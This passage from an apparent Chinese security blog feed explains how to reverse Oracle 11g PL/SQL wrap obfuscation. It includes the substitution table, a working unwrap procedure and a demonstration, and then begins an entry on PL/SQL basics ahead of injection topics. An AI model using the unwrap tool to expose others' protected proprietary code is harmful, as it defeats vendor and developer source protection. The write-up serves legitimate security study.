src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/11.png"></p><p>​        还未达到00-FF总共256条记录，建议替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;procedure &#x27;||vChar txt from dual</span><br></pre></td></tr></table></figure><p>​        中的procedure关健字为package或者function类似的，继续运行直到替换表中有不重复的256条记录为止。有了替换表的内容，就可以unwrap出明文。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/12.png"></p><p>替换表的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3D6585B318DBE287F152AB634BB5A05F7D687B9B24C228678ADEA4261E03EB176F343E7A3FD2A96A0FE935561FB14D1078D975F6BC4104816106F9ADD6D5297E869E79E505BA84CC6E278EB05DA8F39FD0A271B858DD2C38994C480755E4538C46B62DA5AF322240DC50C3A1258B9C16605CCFFD0C981CD4376D3C3A30E86C3147F533DA43C8E35E1994ECE6A39514E09D64FA5915C52FCABB0BDFF297BF0A76B449445A1DF0009621807F1A82394FC1A7D70DD1D8FF139370EE5BEFBE09B97772E7B254B72AC7739066200E51EDF87C8F2EF412C62B83CDACCB3BC44EC069366202AE88FCAA4208A64557D39ABDE1238D924A1189746B91FBFEC901EA1BF7CE</span><br></pre></td></tr></table></figure><h4 id="3-2-4-编写Unwrap-PL-SQL程序"><a href="#3-2-4-编写Unwrap-PL-SQL程序" class="headerlink" title="3.2.4 编写Unwrap PL/SQL程序"></a>3.2.4 编写Unwrap PL/SQL程序</h4><p>​        写unwrap.sql程序，思路反向操作，得到密文的替换串，截取20字节后的替换串，然后查表得到LZ压缩串，再通过LZ_java包解压得到明文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on;</span><br><span class="line">create directory FILEPATH as &#x27;D:\sql_files&#x27;;  --创建一个路径FILEPATH</span><br><span class="line">grant read,write on directory FILEPATH to sys; --给用户sys授予路径读写的权限</span><br><span class="line">create or replace procedure unwrap(o in varchar,n in varchar, t in varchar)</span><br><span class="line">as</span><br><span class="line">vWrappedtext Varchar2(32767);               </span><br><span class="line">vtrimtext Varchar2(32767);          </span><br><span class="line">vChar Varchar2(2);</span><br><span class="line">vRepchar Varchar2(2);</span><br><span class="line">vLZinflatestr Varchar2(32767);</span><br><span class="line">nLen Integer;</span><br><span class="line">nLoop Integer;</span><br><span class="line">nCnt Integer;</span><br><span class="line">l_file utl_file.file_type;</span><br><span class="line"></span><br><span class="line">type vartab is table of varchar2(2) index by varchar2(2);</span><br><span class="line">mytbl vartab;</span><br><span class="line">cursor getchar is select C_BASE64DECODE xr,C_LZDEFLATECODE dr from sys.idltranslate;</span><br><span class="line">Begin</span><br><span class="line">for i in getchar loop --sys.idltranslate表内容存到字符数组</span><br><span class="line">   mytbl(i.xr):=i.dr;</span><br><span class="line">end loop;</span><br><span class="line">vtrimtext:=&#x27;&#x27;;</span><br><span class="line">select count(*) into nCnt from DBA_SOURCE</span><br><span class="line">Where owner=o</span><br><span class="line">And Name = n</span><br><span class="line">And Type = t ;</span><br><span class="line">if nCnt &gt;0 and nCnt &lt;5 then</span><br><span class="line">for i in 1..nCnt loop</span><br><span class="line">if i=1 then</span><br><span class="line">select rtrim( substr( TEXT, instr( TEXT, chr( 10 ), 1, 20 ) + 1 ), chr(10) )   --保存去掉换行的BASE64码正文</span><br><span class="line">into vLZinflatestr</span><br><span class="line">from DBA_SOURCE</span><br><span class="line">Where owner = o</span><br><span class="line">And Name = n</span><br><span class="line">And Type = t and line=i;</span><br><span class="line">else</span><br><span class="line">select text into vLZinflatestr</span><br><span class="line">from DBA_SOURCE</span><br><span class="line">Where owner = o</span><br><span class="line">And Name = n</span><br><span class="line">And Type=t and line=i;</span><br><span class="line">end if;</span><br><span class="line">vtrimtext:=vtrimtext||vLZinflatestr;</span><br><span class="line">end loop;</span><br><span class="line">end if;</span><br><span class="line">vtrimtext:=replace(vtrimtext,chr(10),&#x27;&#x27;);</span><br><span class="line">nLen := Length(vtrimtext)/64 ;</span><br><span class="line">vWrappedtext :=&#x27;&#x27;;</span><br><span class="line">for i in 0..nLen  loop  </span><br><span class="line">if i&lt; nLen then</span><br><span class="line">vWrappedtext:=vWrappedtext||utl_encode.base64_decode( utl_raw.cast_to_raw(substrb(vtrimtext,64*i+1 , 64 ))) ;</span><br><span class="line">else</span><br><span class="line">vWrappedtext:=vWrappedtext||utl_encode.base64_decode( utl_raw.cast_to_raw(substrb(vtrimtext,64*i+1  ))) ;</span><br><span class="line">end if;</span><br><span class="line">--DBMS_OUTPUT.PUT_LINE(vWrappedtext);</span><br><span class="line">End Loop;</span><br><span class="line">--vWrappedtext:=substr(vWrappedtext,41);</span><br><span class="line">nLen := Length(vWrappedtext)/2 - 1;</span><br><span class="line">vLZinflatestr :=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">For nLoop In 20..nLen Loop --从第21字节开始</span><br><span class="line">vChar := Substrb(vWrappedtext,nLoop*2+1,2);</span><br><span class="line">/*</span><br><span class="line">Select Count(*) Into nCnt From SYS.IDLTRANSLATE Where C_BASE64DECODE=vChar;</span><br><span class="line">If nCnt &lt;&gt; 1 Then</span><br><span class="line">DBMS_OUTPUT.PUT_LINE(&#x27;SUBSTATION TABLE WARNING: Count not find following char--&#x27;||vChar);</span><br><span class="line">Return;</span><br><span class="line">Else</span><br><span class="line">Select C_LZDEFLATECODE Into vRepchar From SYS.IDLTRANSLATE Where C_BASE64DECODE=vChar;</span><br><span class="line">End If;</span><br><span class="line">*/</span><br><span class="line">vLZinflatestr := vLZinflatestr || mytbl(vChar); --从字符数组匹配</span><br><span class="line">--DBMS_OUTPUT.PUT_LINE(vLZinflatestr);</span><br><span class="line">End Loop;</span><br><span class="line">--DBMS_OUTPUT.PUT_LINE(vLZinflatestr);</span><br><span class="line">l_file := utl_file.fopen(&#x27;FILEPATH&#x27;, &#x27;unwrap_text.sql&#x27;, &#x27;W&#x27;); --给文件变量赋予一个初值unwrap_text.sql，最后一个参数W表示写入</span><br><span class="line">utl_file.put_line(l_file, amosunwrapper.inflate(vLZinflatestr));</span><br><span class="line">utl_file.fclose(l_file);--关闭文件</span><br><span class="line">DBMS_OUTPUT.PUT_LINE(amosunwrapper.inflate(vLZinflatestr));</span><br><span class="line">End;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><h2 id="4-Wrap和Unwrap过程"><a href="#4-Wrap和Unwrap过程" class="headerlink" title="4. Wrap和Unwrap过程"></a>4. Wrap和Unwrap过程</h2><p>1.先编一个需要wrap的sql文件，test.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">create or replace function test_f(hy in varchar)</span><br><span class="line">return varchar</span><br><span class="line">as</span><br><span class="line">x varchar(2);</span><br><span class="line">begin</span><br><span class="line">select</span><br><span class="line">case</span><br><span class="line">when hy &gt;=&#x27;01&#x27; and hy&lt;= &#x27;05&#x27; then 1</span><br><span class="line">when hy &gt;=&#x27;06&#x27; and hy&lt;= &#x27;11&#x27; then 2</span><br><span class="line">when hy &gt;=&#x27;13&#x27; and hy&lt;= &#x27;43&#x27; then 3</span><br><span class="line">when hy &gt;=&#x27;44&#x27; and hy&lt;= &#x27;46&#x27; then 4</span><br><span class="line">when hy &gt;=&#x27;47&#x27; and hy&lt;= &#x27;50&#x27; then 5</span><br><span class="line">when hy &gt;=&#x27;51&#x27; and hy&lt;= &#x27;59&#x27; then 6</span><br><span class="line">when hy &gt;=&#x27;60&#x27; and hy&lt;= &#x27;62&#x27; then 7</span><br><span class="line">when hy  =&#x27;63&#x27; or  hy = &#x27;65&#x27; then 8</span><br><span class="line">when hy &gt;=&#x27;66&#x27; and hy&lt;= &#x27;67&#x27; then 9</span><br><span class="line">when hy &gt;=&#x27;68&#x27; and hy&lt;= &#x27;71&#x27; then 10</span><br><span class="line">when hy &gt;=&#x27;72&#x27; and hy&lt;= &#x27;72&#x27; then 11</span><br><span class="line">when hy &gt;=&#x27;73&#x27; and hy&lt;= &#x27;74&#x27; then 12</span><br><span class="line">when hy &gt;=&#x27;75&#x27; and hy&lt;= &#x27;78&#x27; then 13</span><br><span class="line">when hy &gt;=&#x27;79&#x27; and hy&lt;= &#x27;81&#x27; then 14</span><br><span class="line">when hy &gt;=&#x27;82&#x27; and hy&lt;= &#x27;83&#x27; then 15</span><br><span class="line">when hy &gt;=&#x27;84&#x27; and hy&lt;= &#x27;84&#x27; then 16</span><br><span class="line">when hy &gt;=&#x27;85&#x27; and hy&lt;= &#x27;87&#x27; then 17</span><br><span class="line">when hy &gt;=&#x27;88&#x27; and hy&lt;= &#x27;92&#x27; then 18</span><br><span class="line">when hy &gt;=&#x27;93&#x27; and hy&lt;= &#x27;98&#x27; then 19</span><br><span class="line">else null</span><br><span class="line">end</span><br><span class="line">into x from dual;</span><br><span class="line">return x;</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>2.用wrap工具加密test.sql文件，在cmd里运行wrap工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Tahir&gt; wrap iname=C:\Users\Tahir\Desktop\instantclient_12_1\test.sql oname=C:\Users\Tahir\Desktop\instantclient_12_1\test.plb</span><br><span class="line"></span><br><span class="line">wrap iname=C:\Users\Tahir\Desktop\instantclient_12_1\test2.sql oname=C:\Users\Tahir\Desktop\instantclient_12_1\test2.plb</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/15.png"></p><p>3.用plb文件创建函数</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/13.png"></p><p>4.测试函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.test_f(&#x27;45&#x27;) from dual;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/14.png"></p><p> 5.加密后的内容</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/16.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/17.png"></p><p>6.利用unwrap.sql进行解密</p><p>首先执行@unwrap.sql，生成unwrap储存过程</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/18.png"></p><p>调用unwrap存储过程，对test_f进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sys.unwrap(&#x27;SYS&#x27;,&#x27;TEST_F&#x27;,&#x27;FUNCTION&#x27;);</span><br></pre></td></tr></table></figure><p>测试的时候，发现解压LZ会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.zip.ZipException: oversubscribed dynamic bit lengths tree</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/19.png"></p><p>java jdk版本过低，更换版本后解决，执行成功。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/21.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;​        Oracle为PL/SQL开发者提供的一种对他们所写的代码（oracle下的对象Package、Procedure、Function、Java Source等）进行加密的工具。当PL/SQL代码被加密以后，它就被描述为被“包装过”</summary>
      
    
    
    
    <category term="数据库安全" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Database PL/SQL注入漏洞原理</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/</id>
    <published>2021-07-03T03:05:40.000Z</published>
    <updated>2021-07-03T03:11:31.227Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>by Tahir</p><h2 id="1-PL-SQL概述"><a href="#1-PL-SQL概述" class="headerlink" title="1.PL/SQL概述"></a>1.PL/SQL概述</h2><p>PL/SQL是一种ORACLE数据库服务器的编程语言</p><p>继承了ADA（ 阿达·洛芙莱斯）第4代语言的特点</p><p>PL/SQL是一个可移植、高效的事务处理语言：</p><ol><li>支持SQL</li><li>支持面向对象编程</li><li>良好的性能</li><li>效率高</li><li>可移植</li><li>与Oracle集成</li><li>高度安全</li></ol><p>PL/SQL的编码和运行时系统是一项技术，而不是一个独立的产品。可以把这项技术想象成一个能够编译并运行PL/SQL块和子程序的引擎。这个引擎可以安装在Oracle服务器上或安装在Oracle Forms，Oracle Reports这样的开发工具中。所以，PL/SQL可以在两种环境中存在：</p><ol><li>Oracle数据库服务器</li><li>Oracle开发工具</li></ol><p>这两种环境是独立的。PL/SQL虽被绑定到Oracle服务器上，但在某些工具中是无法使用的。在这两种环境下，PL/SQL引擎都能接受有效的PL/SQL块或子程序。下图是PL/SQL引擎处理匿名块的过程，引擎会处理过程化语句，而把SQL语句发送给Oracle服务器端的SQL语句执行程序(SQL Statement Executor)来处理。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/PLSQL%E5%BC%95%E6%93%8E.gif"></p><h3 id="1-1-PL-SQL-块结构"><a href="#1-1-PL-SQL-块结构" class="headerlink" title="1.1 PL/SQL 块结构"></a>1.1 PL/SQL 块结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DECLARE]</span><br><span class="line">declaration_statements</span><br><span class="line">BEGIN</span><br><span class="line">executable_statements</span><br><span class="line"></span><br><span class="line">[EXCEPTION]</span><br><span class="line">exception_handing_statements</span><br><span class="line">END</span><br></pre></td></tr></table></figure><h3 id="1-2-PL-SQL-变量和类型"><a href="#1-2-PL-SQL-变量和类型" class="headerlink" title="1.2 PL/SQL 变量和类型"></a>1.2 PL/SQL 变量和类型</h3><h4 id="1-2-1-变量声明"><a href="#1-2-1-变量声明" class="headerlink" title="1.2.1 变量声明"></a>1.2.1 变量声明</h4><p>语法：variable_name [CONSTANT] type [NOT NULL] [:=value];</p><p>　　variable_name: 用于定义变量名，变量名的命名要符合标识符命名规范。</p><p>　　type: 变量需要使用的数据类型，可以使用所有SQL类型或PL/SQL类型。用方括号 [] 括起来的是可选部分。</p><p>　　CONSTANT: 表示声明为一个常量，常量在定义时需要指定初始值，一旦定义其值，不能再被改变。</p><p>　　NOT NULL: 用于约束变量的值不能为空。</p><p>　　:=value: 用于为变量赋初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">　　v_empname VARCHAR2(20);     --定义员工名称变量</span><br><span class="line">　　v_deptname VARCHAR2(20);    --定义部门名称变量</span><br><span class="line">　　v_hiredate DATE NOT NULL := SYSDATE;  --定义入职日期变量</span><br><span class="line">　　v_empno INT NOT NULL DEFAULT 1111;  --变量员工编码变量</span><br><span class="line">BEGIN</span><br><span class="line">　　NULL;   --不执行任何代码</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>​        注：   :=和DEFAULT是可以互换使用的，都用来为变量赋初始值。一旦出现了NOT NULL关键字，后面必须具有赋初始值的语句。</p><table><thead><tr><th>类型</th><th>子类</th><th>说   明</th><th>范  围</th><th>ORACLE限制</th></tr></thead><tbody><tr><td>CHAR</td><td>CharacterStringRowidNchar</td><td>定长字符串 民族语言字符集</td><td>0à32767可选,确省=1</td><td>2000</td></tr><tr><td>VARCHAR2</td><td>Varchar, StringNVARCHAR2</td><td>可变字符串民族语言字符集</td><td>0à327674000</td><td>4000</td></tr><tr><td>BINARY_INTEGER</td><td></td><td>带符号整数,为整数计算优化性能</td><td></td><td></td></tr><tr><td>NUMBER(p,s)</td><td>Dec Double precisionIntegerIntNumericRealSmall int</td><td>小数, NUMBER 的子类型高精度实数整数, NUMBER 的子类型整数, NUMBER 的子类型与NUMBER等价与NUMBER等价整数, 比 integer 小</td><td></td><td></td></tr><tr><td>LONG</td><td></td><td>变长字符串</td><td>0-&gt;2147483647</td><td>32,767字节</td></tr><tr><td>DATE</td><td></td><td>日期型</td><td>公元前4712年1月1日至公元后4712年12月31日</td><td></td></tr><tr><td>BOOLEAN</td><td></td><td>布尔型</td><td>TRUE, FALSE,NULL</td><td>不使用</td></tr><tr><td>ROWID</td><td></td><td>存放数据库行号</td><td></td><td></td></tr><tr><td>UROWID</td><td></td><td>通用行标识符，字符类型</td><td></td><td></td></tr></tbody></table><p>　如果变量在声明时没有指定初始值，默认情况下，变量被初始化为NULL值。如果未给变量赋值，就直接使用变量，将会产生意想不到的结果。</p><p>　　根据变量的不同类型，可以为变量直接赋常量值，也可以使用表达式来计算变量的值。</p><p>　　下面的代码根据薪资和加薪比例来计算员工的结果薪资值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">　　v_salary NUMBER(7,2);</span><br><span class="line">　　v_rate NUMBER(7,2) :=0.12;</span><br><span class="line">　　v_base_salary NUMBER(7,2) :=1200;</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line"> 　v_salary := v_base_salary*(1+v_rate); --使用表达式为变量赋值</span><br><span class="line">　　DBMS_OUTPUT.put_line(&#x27;员工的薪资值为：&#x27;||v_salary);</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>在为PL/SQL变量赋值时，需要注意变量的类型。下面列出了常用的变量类型的赋值方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">　　v_string VARCHAR2(200);</span><br><span class="line">　　v_hire_date DATE;</span><br><span class="line">　　v_bool BOOLEAN;  --PL/SQL布尔类型</span><br><span class="line">BEGIN</span><br><span class="line">　　v_bool:=True;  --为布尔类型赋值</span><br><span class="line">　　v_hire_date:=to_date(&#x27;2019-04-28&#x27;,&#x27;yyyy-mm-dd&#x27;); --使用函数为日期赋值</span><br><span class="line">　　v_hire_date:=SYSDATE;  --使用日期函数赋值</span><br><span class="line">　　v_hire_date:=date&#x27;2019-04-28&#x27;;  --直接赋静态日期值</span><br><span class="line">　　v_string:=&#x27;this is a string&#x27;;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><h4 id="1-2-2-游标"><a href="#1-2-2-游标" class="headerlink" title="1.2.2 游标"></a>1.2.2 游标</h4><p>Oracle使用工作区(work area)来执行SQL语句，并保存处理信息。PL/SQL可以让我们使用游标来为工作区命名，并访问存储的信息。游标的类型有两种：隐式和显式。PL/SQL会为所有的SQL数据操作声明一个隐式的游标，包括只返回一条记录的查询操作。对于返回多条记录的查询，我们可以显式地声明一个游标来处理每一条记录。如下例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line"> CURSOR c1 IS</span><br><span class="line">  SELECT empno, ename, job</span><br><span class="line">   FROM emp</span><br><span class="line">   WHERE deptno = 20;</span><br></pre></td></tr></table></figure><p>由多行查询返回的行集合称为结果集(result set)。它的大小就是满足我们查询条件的行的个数。如下图所示，显式游标”指向”当前行的记录，这可以让我们的程序每次处理一条记录。</p><p>多行查询处理有些像文件处理。例如，一个COBOL程序打开一个文件，处理记录，然后关闭文件。同样，一个PL/SQL程序打开一个游标，处理查询出来的行，然后关闭游标。就像文件指针能标记打开文件中的当前位置一样，游标能标记出结构集的当前位置。</p><p>我们可以使用OPEN，FETCH和CLOSE语句来控制游标，OPEN用于打开游标并使游标指向结果集的第一行，FETCH会检索当前行的信息并把游标指移向下一行，当最后一行也被处理完后，CLOSE就会关闭游标。</p><h4 id="1-2-3-游标FOR循环"><a href="#1-2-3-游标FOR循环" class="headerlink" title="1.2.3 游标FOR循环"></a>1.2.3 游标FOR循环</h4><p>在大多需要使用显式游标的情况下，我们都可以用一个简单的游标FOR循环来代替OPEN，FETCH和CLOSE语句。首先，游标FOR循环会隐式地声明一个代表当前行的循环索引(loop index)变量。下一步，它会打开游标，反复从结果集中取得数据并放到循环索引的各个域(field)中。当所有行都被处理过以后，它就会关闭游标。下面的例子中，游标FOR循环隐式地声明了一个emp_rec记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line"> CURSOR c1 IS</span><br><span class="line">  SELECT ename, sal, hiredate, deptno</span><br><span class="line">   FROM emp;</span><br><span class="line"> ...</span><br><span class="line">BEGIN</span><br><span class="line"> FOR emp_rec IN c1 LOOP</span><br><span class="line">  ...</span><br><span class="line">  salary_total  := salary_total + emp_rec.sal;</span><br><span class="line"> END LOOP;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p>为了使用每一个查询到的行中的每一个字段，我们可以使用点标志(dot notation)，它的作用就像一个域选择器。</p><h4 id="1-2-4-游标变量"><a href="#1-2-4-游标变量" class="headerlink" title="1.2.4 游标变量"></a>1.2.4 游标变量</h4><p>游标变量的使用方式和游标类似，但更加灵活，因为它不绑定于某个特定的查询，所以可用于打开任何返回类型相兼容的查询语句。游标变量是真正的PL/SQL变量，我们可以为它赋值，把它传递给子程序。如下例，我们把游标变量作为存储过程open_cv的一个参数传进去，程序执行时，可以根据choice值的不同，灵活地打开不同的查询内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE open_cv(generic_cv IN OUT genericcurtyp, choice NUMBER) IS</span><br><span class="line">BEGIN</span><br><span class="line"> IF choice = 1 THEN</span><br><span class="line">  OPEN generic_cv FOR</span><br><span class="line">   SELECT *</span><br><span class="line">    FROM emp;</span><br><span class="line"> ELSIF choice = 2 THEN</span><br><span class="line">  OPEN generic_cv FOR</span><br><span class="line">   SELECT *</span><br><span class="line">    FROM dept;</span><br><span class="line"> ELSIF choice = 3 THEN</span><br><span class="line">  OPEN generic_cv FOR</span><br><span class="line">   SELECT *</span><br><span class="line">    FROM salgrade;</span><br><span class="line"> END IF;</span><br><span class="line"> ...</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><h4 id="1-2-5-属性"><a href="#1-2-5-属性" class="headerlink" title="1.2.5 属性"></a>1.2.5 属性</h4><p>PL/SQL的变量和游标都有着让我们能够直接引用它们各自的数据类型或结构的属性。数据库字段和表也有类似的属性。”%”是一个属性的指示符。</p><ul><li>%TYPE</li></ul><p>%TYPE可以提供一个变量或数据库字段的数据类型，这在声明存放数据库值的变量时是非常有用的。假设我们要声明一个存放表books中的字段my_title的字段的变量时，就可以这样使用%TYPE属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_title 